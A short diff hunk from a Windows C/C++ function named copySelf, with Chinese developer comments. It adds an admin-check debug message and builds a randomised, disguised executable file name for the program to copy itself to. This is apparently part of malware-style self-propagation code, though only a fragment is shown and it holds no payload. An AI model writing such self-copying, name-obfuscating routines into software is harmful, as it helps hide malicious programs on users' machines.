@@ -25,11 +25,14 @@ BOOL copySelf()
 	TCHAR moduleName[MAX_PATH];
 	TCHAR tempPath[MAX_PATH];
 
+	if (CSysInfo::IsRunAsAdmin())
+		MessageBox(NULL, L"admin", L"info", MB_OK);
+
 	GetTempPath(MAX_PATH, tempPath);
 	//GetSystemDirectory(tempPath, MAX_PATH);
 	wprintf(tempPath);
 
-	GetCurrentDirectory(MAX_PATH, currentFullPath);
+	GetCurrentDirectory(MAX_PATH, currentFullPath);	//先放在当前目录吧
 	wsprintf(currentFullPath, L"%s\\X%cm%cr%c%c%c.exe", currentFullPath, SEU_RandEx('A','Z'),
 					SEU_RandEx('b','y'), SEU_RandEx('c','x'), SEU_RandEx('D','W'), SEU_RandEx('e','v'));
 	//本来想着都是az 随机的发现会被编译器优化成一样的
